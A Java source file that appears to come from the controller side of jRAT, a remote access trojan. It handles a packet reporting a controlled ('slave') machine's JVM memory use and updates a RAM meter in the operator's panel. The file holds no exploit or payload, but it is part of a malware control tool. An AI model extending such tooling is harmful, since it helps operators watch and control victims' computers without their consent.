package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameControlPanel;
import io.jrat.client.ui.panels.PanelControlPerformance;
import io.jrat.common.utils.MathUtils;

import java.io.DataInputStream;


public class Packet24JVMMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		long currentMb = slave.readLong();
		long maxMb = slave.readLong();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlPerformance panel = (PanelControlPerformance) frame.panels.get("system monitor");

			if (panel != null) {
				panel.ramMeter.addValue((int) currentMb);
				panel.ramMeter.setText(currentMb + " mb");
				if (currentMb > panel.ramMeter.getMaximum()) {
					panel.ramMeter.setMaximum((int) maxMb);
				}
				if (frame.getTabbedPane().getTitleAt(1).equals("System Info") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.ramMeter.repaint();
				}
				panel.barRAM.setValue(MathUtils.getPercentFromTotal((int) currentMb, (int) maxMb));
			}
		}

	}

}
